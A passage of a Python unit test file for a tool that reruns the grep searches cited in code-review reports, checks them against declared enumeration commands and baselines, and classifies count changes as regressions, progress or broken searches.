        self.write("a.txt", "x\nx\n")
        f = self.write("findings.md",
                       "## Sections cleared\n"
                       "- **X** — cleared by: `grep -c x a.txt` -> 9 matches\n")
        self.assertEqual(vc.main([str(f), "--cwd", str(self.td)]), 1)

    def test_exit_0_when_everything_reproduces(self):
        self.write("a.txt", "x\n")
        f = self.write("findings.md",
                       "## Sections cleared\n"
                       "- **X** — cleared by: `grep -c x a.txt` -> 1 matches\n"
                       "- **Y** — unverified — nothing to check against\n")
        self.assertEqual(vc.main([str(f), "--cwd", str(self.td)]), 0)


if __name__ == "__main__":
    unittest.main()


class DeclaredEnumerationsCase(unittest.TestCase):
    """The declared search is what makes two runs measure the same population.

    Without it each run invents a regex: three reviews of one project checked the
    same radius rule with searches returning 189, 24 and 203 sites, and the middle
    one cleared it as `24 of 24` — honestly, verifiably, against the wrong 24.
    """

    ENUM = """# Review enumerations
## design-critic
| # | checklist item | kind | enumerate | baseline |
|---|----------------|------|-----------|----------|
| 1 | radius from the token scale | candidates | `grep -rn "BorderRadius.circular(" src` | 189 |
| 2 | no raw hex | violations | `grep -rn "0xFF" src \\| grep -v theme` | 12 |
| 3 | not yet declared | violations | <read-only command> | 0 |
| 4 | also not declared | violations | `<read-only command>` | 0 |
| 5 | no kind given | | `grep -rn "zzz" src` | 3 |

## security-reviewer
| # | category | kind | enumerate | baseline |
|---|----------|------|-----------|----------|
| 1 | Injection | candidates | `grep -rn "rawQuery" src` | 40 |
"""

    def report(self, rows: str) -> str:
        return ("# R\n\n## Coverage\n"
                "| # | item | what you checked | inspected | result |\n"
                "|---|------|------------------|-----------|--------|\n" + rows)

    def declared(self, reviewer="design-critic"):
        return vc.declared_enumerations(self.ENUM, reviewer)

    def test_parses_only_the_named_reviewers_section(self):
        d = self.declared()
        self.assertEqual(d[1]["command"], 'grep -rn "BorderRadius.circular(" src')
        self.assertNotIn(4, d)
        sec = self.declared("security-reviewer")
        self.assertEqual(list(sec), [1])
        self.assertEqual(sec[1]["command"], 'grep -rn "rawQuery" src')

    def test_parses_kind_and_baseline(self):
        d = self.declared()
        self.assertEqual((d[1]["kind"], d[1]["baseline"]), ("candidates", 189))
        self.assertEqual((d[2]["kind"], d[2]["baseline"]), ("violations", 12))

    def test_missing_kind_defaults_to_candidates(self):
        # Conservative on purpose: a candidates item can never be reported closed
        # by count, so a malformed kind fails toward "cannot close" rather than
        # toward a false completion.
        self.assertEqual(self.declared()[5]["kind"], "candidates")

    def test_item_number_is_not_mistaken_for_a_baseline(self):
        # `#` is always a digit; scanning cells for a number must skip it or an
        # undeclared baseline silently becomes the row index.
        d = vc.declared_enumerations(
            "## design-critic\n"
            "| # | item | kind | enumerate | baseline |\n"
            "|---|------|------|-----------|----------|\n"
            "| 7 | x | violations | `grep -rn q src` |  |\n", "design-critic")
        self.assertIsNone(d[7]["baseline"])

    def test_unescapes_a_piped_command(self):
        # In a markdown table a literal pipe is written `\\|`; leaving it escaped
        # would make every piped declaration mismatch its own use.
        self.assertEqual(self.declared()[2]["command"],
                         'grep -rn "0xFF" src | grep -v theme')

    def test_placeholder_rows_are_not_declarations(self):
        # Both shapes the template ships. The backticked one is the dangerous
        # case: it parses as a command, so an untouched template would look fully
        # declared and every review would "match" a placeholder.
        d = self.declared()
        self.assertNotIn(3, d, "<read-only command> is not a command")
        self.assertNotIn(4, d, "`<read-only command>` is not a command either")

    def test_matching_search_is_not_reported(self):
        rows = ('| 1 | radius | `grep -rn "BorderRadius.circular(" src` -> 4 matches '
                '| 4 of 4 | none |\n')
        self.assertEqual(
            vc.undeclared_searches(self.report(rows), self.declared()), [])

    def test_whitespace_differences_are_not_drift(self):
        rows = ('| 1 | radius | `grep  -rn   "BorderRadius.circular("   src` -> 4 matches '
                '| 4 of 4 | none |\n')
        self.assertEqual(
            vc.undeclared_searches(self.report(rows), self.declared()), [])

    def test_a_narrower_search_is_caught(self):
        # The exact snuggle failure: a tighter regex, a clean row, a smaller
        # population, and no other signal that anything was missed.
        rows = ('| 1 | radius | `grep -rn "BorderRadius.circular([0-9]" src` -> 3 matches '
                '| 3 of 3 | none |\n')
        got = vc.undeclared_searches(self.report(rows), self.declared())
        self.assertEqual(len(got), 1)
        self.assertEqual(got[0]["index"], 1)
        self.assertIn("[0-9]", got[0]["used"])

    def test_a_row_citing_no_command_is_caught(self):
        rows = "| 1 | radius | read the widget files | 3 of 3 | none |\n"
        got = vc.undeclared_searches(self.report(rows), self.declared())
        self.assertEqual(got[0]["used"], "", "no command cited where one is declared")

    def test_undeclared_items_are_left_alone(self):
        # Item 3 has no declaration, so the row is the coverage check's business,
        # not this one's — reporting it here would penalise honest `unverified`.
        rows = "| 3 | not yet declared | — | — | unverified — no enumeration declared |\n"
        self.assertEqual(
            vc.undeclared_searches(self.report(rows), self.declared()), [])

    def test_no_declarations_means_no_opinion(self):
        rows = '| 1 | radius | `grep -rn "anything" src` -> 1 matches | 1 of 1 | none |\n'
        self.assertEqual(vc.undeclared_searches(self.report(rows), {}), [])


class BaselineDriftCase(unittest.TestCase):
    """A count moving means opposite things depending on the item's shape.

    `violations` reaching zero is the goal. `candidates` reaching zero is a broken
    search — compliant sites never leave that set by being fixed — and reading it
    as a finished rule is the most dangerous false success available here.
    """

    def declared(self, kind, baseline, cmd="grep -rn x src"):
        return {1: {"command": cmd, "kind": kind, "baseline": baseline, "item": "r"}}

    def results(self, actual, cmd="grep -rn x src"):
        return [{"command": cmd, "actual": actual, "status": "reproduced"}]

    def one(self, kind, baseline, actual):
        got = vc.baseline_drift(self.results(actual), self.declared(kind, baseline))
        return got[0] if got else None

    # --- violations ---------------------------------------------------------

    def test_violations_above_baseline_is_a_regression(self):
        d = self.one("violations", 5, 8)
        self.assertEqual(d["status"], "regressed")
        self.assertIn("new", d["detail"])

    def test_violations_below_baseline_is_progress(self):
        self.assertEqual(self.one("violations", 5, 3)["status"], "progress")

    def test_violations_at_zero_is_closed(self):
        self.assertEqual(self.one("violations", 5, 0)["status"], "closed")

    def test_violations_unchanged_is_silent(self):
        self.assertIsNone(self.one("violations", 5, 5), "no news is not news")

    # --- candidates ---------------------------------------------------------

    def test_candidates_at_zero_is_a_broken_search_not_a_win(self):
        d = self.one("candidates", 189, 0)
        self.assertEqual(d["status"], "search-broken")
        self.assertIn("stopped matching", d["detail"])

    def test_candidates_collapsing_is_suspect(self):
        self.assertEqual(self.one("candidates", 189, 20)["status"], "search-suspect")

    def test_candidates_growing_is_not_a_regression(self):
        # The set grows as the codebase grows; that is not new bad code, and
        # calling it a regression would train people to ignore the check.
        self.assertIsNone(self.one("candidates", 189, 210))

    # --- wiring -------------------------------------------------------------

    def test_no_baseline_means_no_comparison(self):
        self.assertEqual(
            vc.baseline_drift(self.results(3), self.declared("violations", None)), [])

    def test_a_command_that_never_ran_is_skipped(self):
        # The row cited something else, or nothing; there is no live count to
        # compare, and inventing one would be worse than staying quiet.
        self.assertEqual(
            vc.baseline_drift([], self.declared("violations", 5)), [])

    def test_matching_is_whitespace_insensitive(self):
        got = vc.baseline_drift(self.results(0, "grep  -rn   x  src"),
                                self.declared("violations", 5))
        self.assertEqual(got[0]["status"], "closed")
